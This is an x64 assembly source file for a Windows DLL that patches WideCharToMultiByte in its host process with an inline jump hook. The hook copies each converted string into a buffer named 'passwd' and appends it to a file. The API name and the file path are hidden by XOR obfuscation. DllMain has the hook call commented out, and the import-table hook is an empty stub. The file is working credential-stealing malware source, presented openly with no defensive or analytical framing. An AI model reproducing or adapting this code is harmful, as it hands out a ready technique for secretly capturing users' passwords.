DEFAULT REL

section .text
global DllMain

global hook_iat
export hook_iat

global hook_inline_patch
export hook_inline_patch

%include '..\utils_64_text.asm'

; arg0: CodePage            rcx
; arg1: dwFlags             rdx
; arg2: ccWideChar          r8
; arg3: lpWideCharStr       r9
; arg4: lpMultiByteStr      [rsp + 32]
; arg5: cbMultiByte         [rsp + 40]
; arg6: lpDefaultChar       [rsp + 48]
; arg7: lpUseDefaultChar    [rsp + 56]
;
; return: num bytes written rax
hooked_wide_char_to_multibyte_inline_patch:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; code page
    mov [rbp + 24], rdx             ; dwflags
    mov [rbp + 32], r8              ; ccWideChar
    mov [rbp + 40], r9              ; lpWideCharStr

    ; [rbp - 8] = return value
    ; [rbp - 16] = bytes written
    ; [rbp - 24] = text file handle
    ; 8 bytes padding
    sub rsp, 32                     ; allocate local variable space
    sub rsp, 32                     ; allocate 32 byte shadow space

    ; replace patch with original bytes so the original function can be called and 
    ; operation can continue as normal
    sub rsp, 16                         ; 1 arg + 8 bytes padding
    mov rcx, -1                         ; current process
    mov rdx, [wide_char_to_multibyte]
    mov r8, original_func_bytes
    mov r9, 14
    mov qword [rsp + 32], 0
    call [write_process_memory]
    add rsp, 16                         ; 1 arg + 8 bytes padding

    cmp rax, 0                          ; WriteProcessMemory failed ?
    je .shutdown

    ; call the original function
    sub rsp, 32                     ; 4 args
    mov rcx, [rbp + 16]
    mov rdx, [rbp + 24]
    mov r8, [rbp + 32]
    mov r9, [rbp + 40]
    mov rax , [rbp + 48]
    mov [rsp + 32], rax
    mov rax, [rbp + 56]
    mov [rsp + 40], rax
    mov rax, [rbp + 64]
    mov [rsp + 48], rax
    mov rax, [rbp + 72]
    mov [rsp + 56], rax
    call [wide_char_to_multibyte]   ; bytes written
    add rsp, 32                     ; 4 args

    mov [rbp - 16], rax             ; bytes written

    ; sub rsp, 32
    mov rcx, passwd
    mov rdx, [rbp + 48]             ; lpMultiByteStr
    call strcpy
    ; add rsp, 32

    ; sub rsp, 32
    mov rcx, file_path_xor
    mov rdx, file_path_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor
    ; add rsp, 32

    sub rsp, 32                     ; 3 args + 8 byte padding
    mov rcx, file_path_xor
    mov rdx, FILE_APPEND_DATA
    mov r8, FILE_SHARE_READ
    xor r9, r9
    mov qword [rsp + 32], OPEN_ALWAYS
    mov qword [rsp + 40], FILE_ATTRIBUTE_NORMAL
    mov qword [rsp + 48], 0
    call [create_file]              ; file handle
    add rsp, 32                     ; 3 args + 8 byte padding

    cmp rax, INVALID_HANDLE_VALUE   ; file handle invalid ?
    je .shutdown

    mov [rbp - 24], rax             ; file handle

    sub rsp, 16                     ; 1 arg + 8 byte paddding
    mov rcx, [rbp - 24]             ; text file handle
    mov rdx, passwd
    mov r8, [rbp - 16]              ; bytes to write, len of passwd entered
    xor r9, r9
    mov qword [rsp + 32], 0
    call [write_file]
    add rsp, 16                     ; 1 arg + 8 byte padding

    cmp rax, 0                      ; write file failed ?
    je .shutdown

    ; sub rsp, 32
    mov rcx, [rbp - 24]             ; text file handle
    call [close_handle]
    ; add rsp, 32

    cmp rax, 0                      ; close handle failed ?
    je .shutdown

.shutdown:
    add rsp, 32                     ; free 32 byte shadow space
    add rsp, 32                     ; free local variable space

    leave
    ret

hook_iat:
    push rbp
    mov rbp, rsp

    leave
    ret

hook_inline_patch:
    push rbp
    mov rbp, rsp
    ; [rbp - 8] = return value
    ; [rbp - 16] = kernel handle
    ; [rbp - 32] = patch
    sub rsp, 32                     ; allocate local variable space
    sub rsp, 32                     ; allocate shadow space

    mov qword [rbp - 8], 0          ; return value

    ; sub rsp, 32
    call get_kernel_module_handle   ; kernel handle
    ; add rsp, 32

    cmp rax, 0                      ; kernel handle == 0 ?
    je .shutdown

    mov [rbp - 16], rax             ; kernel handle

    ; sub rsp, 32
    mov rcx, [rbp - 16]
    call populate_kernel_function_ptrs_by_name
    ; add rsp, 32

    ; sub rsp, 32
    mov rcx, wide_char_to_multibyte_xor
    mov rdx, wide_char_to_multibyte_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor
    ; add rsp, 32

    ; sub rsp, 32
    mov rcx, [rbp - 16]
    mov rdx, wide_char_to_multibyte_xor
    call [get_proc_addr]            ; wide char to multi byte addr
    ; add rsp, 32

    cmp rax, 0                      ; is addr == 0 ?
    je .shutdown

    mov [wide_char_to_multibyte], rax   ; WideCharToMultiByte addr

    ; sub rsp, 32
    ; call [get_current_process] ; current proc id
    ; add rsp, 32

    ; mov [rbp - 24], rax             ; current proc id

    ; read 14 bytes from the original function
    sub rsp, 16                     ; 1 arg + 8 byte padding
    mov rcx, -1                     ; current proc id
    mov rdx, [wide_char_to_multibyte]
    mov r8, original_func_bytes
    mov r9, 14
    mov qword [rsp + 32], 0
    call [read_process_memory]      ; read result
    add rsp, 16                     ; 1 arg + 8 byte padding

    cmp rax, 0                      ; ReadProcessMemory failed ?
    je .shutdown

    ; create patch
    ; sub rsp, 32
    mov rcx, rbp
    sub rcx, 32
    mov dword [rcx], 0x25ff
    add rcx, 4
    mov dword [rcx], 0
    add rcx, 2
    mov rax, hooked_wide_char_to_multibyte_inline_patch
    mov [rcx], rax

    ; replace original code with patch
    sub rsp, 16                         ; 1 arg + 8 bytes padding
    mov rcx, -1                         ; current proc id
    mov rdx, [wide_char_to_multibyte]
    mov r8, rbp
    sub r8, 32
    mov r9, 14
    mov qword [rsp + 32], 0
    call [write_process_memory]
    add rsp, 16                         ; 1 arg + 8 bytes padding

    cmp rax, 0                          ; WriteProcess failed ?
    je .shutdown

.shutdown:
    add rsp, 32                     ; free shadow space
    add rsp, 32                     ; free local variable space

    leave
    ret

; arg0: hInstance       rcx
; arg1: dwReason        rdx
; arg2: reserved        r8
;
; return: BOOL          rax
DllMain:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; hInstance
    mov [rbp + 24], rdx                     ; dwReason
    mov [rbp + 32], r8                      ; reserved

    cmp qword [rbp + 24], 1                 ; PROCESS_ATTACH
    jne .continue

    ; call hook_inline_patch
    jmp .shutdown

.continue:
    cmp qword [rbp + 24], 0                 ; PROCESS_DETACH
    jne .shutdown

.shutdown:
    mov rax, 1

    leave
    ret

section .data
wide_char_to_multibyte_xor: db 0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0
.len equ $ - wide_char_to_multibyte_xor - 1

file_path_xor: db 0x73, 0xa, 0x6c, 0x6c, 0x62, 0x64, 0x7f, 0x6c, 0x6c, 0x40, 0x47, 0x5f, 0x42, 0x54, 0x1e, 0x44, 0x48, 0x44, 0x0
.len equ $ - file_path_xor - 1

just_str: db 'just', 0
.len equ $ - just_str

%include '../utils_64_data.asm'

section .bss
wide_char_to_multibyte: dq ?
original_func_bytes: resb 14
passwd: resb 128